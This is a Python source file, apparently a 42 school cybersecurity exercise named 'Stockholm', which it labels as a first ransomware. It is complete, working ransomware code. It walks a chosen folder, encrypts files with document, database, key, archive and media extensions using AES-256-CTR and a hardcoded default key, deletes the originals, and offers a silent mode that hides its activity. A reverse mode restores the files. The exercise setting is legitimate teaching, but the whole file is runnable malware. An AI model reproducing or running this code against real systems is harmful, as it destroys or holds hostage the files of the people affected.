# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: ysabik <ysabik@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/12/02 09:16:15 by ysabik            #+#    #+#              #
#    Updated: 2024/12/09 04:21:51 by ysabik           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import os
import sys
import datetime
from Crypto.Cipher import AES
from hashlib import sha256


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from cyberlib import cprint, ArgParser, ArgError, Color


def print(
		*values: object,
		sep: str | None = " ",
		end: str | None = "\n",
		reset: bool = True,
		char: str = Color.DEFAULT_MAGIC_CHAR,
		) -> None:
	t = f'§f[{datetime.datetime.now().strftime("%H:%M:%S")}]§r'
	s = f'§7[§bStockholm§7]§r'
	return cprint(t, s, *values, sep=sep, end=end, reset=reset, char=char)


class Stockholm:
	VERSION		= '1.0.0'
	HEADER		= b'STOCKHOLM'
	DEFAULT_KEY	= 'qmVSKONoNeFHdYsGZ7HlwDiZHhxrsBH2PCPkK7hVP1MDz3SW'
	DEFAULT_DIR	= '~/infection/'
	EXT_OUT		= '.ft'
	EXT			= [
		'.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott',
		'.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc',
		'.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop',
		'.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
		'.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm',
		'.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c',
		'.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs',
		'.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp',
		'.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla',
		'.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp',
		'.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg',
		'.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png',
		'.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar',
		'.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC',
		'.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti',
		'.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1',
		'.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb',
		'.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx',
		'.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx',
		'.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls',
		'.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
	]

	def __init__(self) -> None:
		self.key = Stockholm.DEFAULT_KEY
		self.dir = Stockholm.DEFAULT_DIR
		self.reverse = False

	def infect(self):
		self.dir = os.path.expanduser(self.dir)
		self.dir = os.path.abspath(self.dir)
		if not os.path.isdir(self.dir):
			cprint(f'§c[ValueError] §4The directory "{stockholm.dir}" does not exist.')
			exit(1)

		print('===================================')
		print('===  Starting the infection...  ===')
		print('===================================')
		print()

		for root, _, files in os.walk(self.dir):
			print(f'§eInfecting§r {root}§e:')

			for file in files:
				if self.reverse:
					if not file.endswith(Stockholm.EXT_OUT):
						continue
				elif not any(file.endswith(ext) for ext in Stockholm.EXT):
					continue
				path = os.path.join(root, file)
				try:
					if self.reverse:
						path = self.decrypt(path)
					else:
						path = self.encrypt(path)
					print(f'§2[SUCCESS]§r §aPath:§r {path}')
				except Exception as e:
					print(f'§4[FAILED]§r §cPath:§r {path}')
					print(f'§4[FAILED]§r §c§n{e.__class__.__name__}')
					print(f'§4[FAILED]§r §c{e}')
			print()

		print('==============  END  ==============')

	def get_header(self, filename: str, content_size: int, nonce: bytes) -> bytes:
		filename = filename.encode('utf-8')

		return Stockholm.HEADER \
				+ content_size.to_bytes(8, 'big') \
				+ len(filename).to_bytes(4, 'big') \
				+ len(nonce).to_bytes(4, 'big') \
				+ filename \
				+ nonce

	def parse_header(self, data: bytes) -> tuple[str, int, bytes, bytes]:
		if not data.startswith(Stockholm.HEADER):
			raise ValueError('Invalid header')
		data = data[len(Stockholm.HEADER):]

		content_size = int.from_bytes(data[:8], 'big')
		data = data[8:]

		filename_size = int.from_bytes(data[:4], 'big')
		data = data[4:]

		nonce_size = int.from_bytes(data[:4], 'big')
		data = data[4:]

		filename = data[:filename_size].decode('utf-8')
		data = data[filename_size:]

		nonce = data[:nonce_size]
		data = data[nonce_size:]
		return filename, content_size, nonce, data

	def encrypt(self, path: str):
		print(f'§f§qEncrypting {path}§f§q...')

		data: bytes = b''
		with open(path, 'rb') as f:
			data = f.read()
		data = Stockholm.HEADER + data

		key = sha256(self.key.encode('utf-8')).digest()
		cipher = AES.new(key, AES.MODE_CTR)

		encrypted_data = cipher.encrypt(data)
		header = self.get_header(os.path.basename(path), len(data), cipher.nonce)

		with open(path + Stockholm.EXT_OUT, 'wb') as f:
			f.write(header)
			f.write(encrypted_data)

		os.remove(path)
		return path + Stockholm.EXT_OUT

	def decrypt(self, path: str):
		print(f'§f§qDecrypting {path}§f§q...')

		data: bytes = b''
		with open(path, 'rb') as f:
			data = f.read()

		filename, content_size, nonce, data = self.parse_header(data)

		key = sha256(self.key.encode('utf-8')).digest()
		cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)

		decrypted_data = cipher.decrypt(data)
		if len(decrypted_data) != content_size:
			raise ValueError(f'Size mismatch: {len(decrypted_data)} != {content_size}')
		if not decrypted_data.startswith(Stockholm.HEADER):
			raise ValueError('Invalid decryption (key may be wrong)')
		decrypted_data = decrypted_data[len(Stockholm.HEADER):]

		filename = os.path.join(os.path.dirname(path), filename)
		with open(filename, 'wb') as f:
			f.write(decrypted_data)

		os.remove(path)
		return filename


if __name__ == '__main__':
	ap = ArgParser(sys.argv[1:]) \
			.add_pre_desc('42-Cybersecurity - Stockholm | First ransomware') \
			.add_pre_desc('Infects all the files contained in a folder, encrypting with AES-256-CTR.') \
			.add_pre_desc() \
			.add_pre_desc('Usage: ./stockholm [FLAGS]') \
			.add_flag('k', 'key', ['key'], 'Encrypt files with <key>. It should be at least 16 chars.') \
			.add_flag('r', 'reverse', None, 'Reverse the infection.') \
			.add_flag('d', 'dir', ['path'], 'Infect the folder <path>. By default: ' + Stockholm.DEFAULT_DIR) \
			.add_flag('s', 'silent', None, 'Do not print anything (even errors).') \
			.add_flag('v', 'version', None, 'Get the current version.') \
			.add_flag('h', 'help', None, 'Print this help message') \
			.add_post_desc('Credits: ysabik (https://github.com/Luzog78)')

	try:
		ap.parse()
	except ArgError as e:
		cprint(f'§c[{e.__class__.__name__}] §4{e}')
		exit(1)

	if ap.get_value('h'):
		print(ap)
		exit(0)

	if ap.get_value('v'):
		cprint(f'§eStockholm §av{Stockholm.VERSION}')
		exit(0)

	if ap.get_value('s'):
		def do_nothing(*args, **kwargs):
			pass
		print = do_nothing
		cprint = do_nothing

	stockholm = Stockholm()

	if ap.get_value('key'):
		stockholm.key = ap.get_value('key', '')
		if len(stockholm.key) < 16:
			cprint('§c[ValueError] §4The key must be at least 16 characters long.')
			exit(1)

	if ap.get_value('dir'):
		stockholm.dir = ap.get_value('dir', '')

	if ap.get_value('reverse'):
		stockholm.reverse = True

	stockholm.infect()

